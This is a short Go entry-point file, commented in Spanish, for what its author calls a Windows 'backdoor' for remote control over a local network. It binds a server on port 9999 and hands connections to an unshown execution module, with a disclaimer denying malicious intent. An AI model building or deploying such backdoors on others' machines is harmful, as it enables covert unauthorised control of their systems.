package main

/*
ACLARACION MUY IMPORTANTE, LEER CON ATENCION:

Este programa NO fue hecho con fines maliciosos y NO me hago responsable de su mal uso.
Simplemente es una utilidad para manipular computadoras fuera del alcance fisico y
dentro de la red (NO esta pensado ni programado para manipular computadoras fuera de la red)
(hacer esto fuera de la red es extremadamente peligroso si no se sabe lo que se esta haciendo)

Este programa actua como servidor y el cliente es el usuario que la manipulara
Se debe asegurar que el backdoor tenga el firewall habilitado en el puerto correspondiente (9999 por defecto)

NOTA: el programa solo esta pensado para entornos WINDOWS, puede que no funcionar en otros sistemas operativos

Autor : Urb@n - https//:www.github.com/Urban20/ - "estamos hack"
*/

import (
	"fmt"
	"os"
	"server/conexiones"
	ejec "server/ejecuciones"
)

const PUERTO = "9999"

func main() {
	ipv4, error := conexiones.Ipv4()
	if error != nil {
		fmt.Println("hubo un error: ", error)
		os.Exit(1)
	} else {
		conex, error := conexiones.Server(ipv4, PUERTO)
		if error != nil {
			os.Exit(1)
		}

		ejec.Escucha(conex)

	}
}
